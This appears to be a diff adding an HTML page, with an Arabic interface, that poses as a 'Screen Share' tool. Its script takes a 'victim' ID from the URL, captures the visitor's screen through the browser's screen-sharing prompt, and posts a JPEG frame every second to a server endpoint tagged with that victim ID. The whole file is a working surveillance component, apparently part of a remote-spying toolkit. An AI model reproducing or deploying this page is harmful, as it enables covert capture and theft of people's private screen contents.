@@ -1,0 +1,49 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Screen Share</title>
+    <meta charset="UTF-8">
+</head>
+<body>
+    <h2>🖥 مشاركة الشاشة...</h2>
+    <p id="status">جارٍ بدء المشاركة...</p>
+    <video id="screenVideo" autoplay></video>
+
+    <script>
+        const params = new URLSearchParams(window.location.search);
+        const victimId = params.get("victim");
+        const video = document.getElementById("screenVideo");
+
+        if (!victimId) {
+            document.getElementById("status").innerText = "❌ لا يوجد Victim ID";
+        } else {
+            navigator.mediaDevices.getDisplayMedia({ video: true })
+                .then(stream => {
+                    video.srcObject = stream;
+                    const canvas = document.createElement("canvas");
+                    const ctx = canvas.getContext("2d");
+
+                    setInterval(() => {
+                        canvas.width = video.videoWidth;
+                        canvas.height = video.videoHeight;
+                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                        const imageData = canvas.toDataURL("image/jpeg", 0.8);
+
+                        fetch(`/api/screen_frame?victim=${victimId}`, {
+                            method: "POST",
+                            headers: { "Content-Type": "application/json" },
+                            body: JSON.stringify({ image: imageData })
+                        }).catch(err => console.error(err));
+
+                    }, 1000); // كل ثانية صورة
+
+                    document.getElementById("status").innerText = "✅ مشاركة الشاشة بدأت!";
+                })
+                .catch(err => {
+                    document.getElementById("status").innerText = "❌ تم إلغاء المشاركة أو حدث خطأ";
+                });
+        }
+    </script>
+</body>
+</html>
